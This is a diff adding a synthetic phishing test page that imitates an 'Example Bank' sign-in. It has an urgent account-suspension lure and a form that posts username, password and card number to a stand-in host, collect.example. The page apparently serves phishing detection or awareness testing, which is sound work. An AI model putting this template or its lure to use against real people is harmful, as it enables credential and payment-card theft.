@@ -1,0 +1,14 @@
+<!doctype html>
+<html lang="en"><meta charset="utf-8"><title>Example Bank – Secure Sign In</title>
+<body style="font: 16px system-ui; max-width: 420px; margin: 60px auto">
+<p><a href="/">← Back to test index</a> · <small>Synthetic phishing test page. Nothing is sent anywhere.</small></p>
+<h1>Example Bank</h1>
+<p style="color:#b42318"><strong>Your account has been suspended.</strong>
+Verify your identity within 24 hours or your account will be permanently closed.</p>
+<form action="https://collect.example/verify" method="post">
+  <p><label>Username<br><input name="user" autocomplete="off"></label></p>
+  <p><label>Password<br><input name="pass" type="password" autocomplete="off"></label></p>
+  <p><label>Card number<br><input name="card" autocomplete="off"></label></p>
+  <button>Verify account</button>
+</form>
+</body></html>
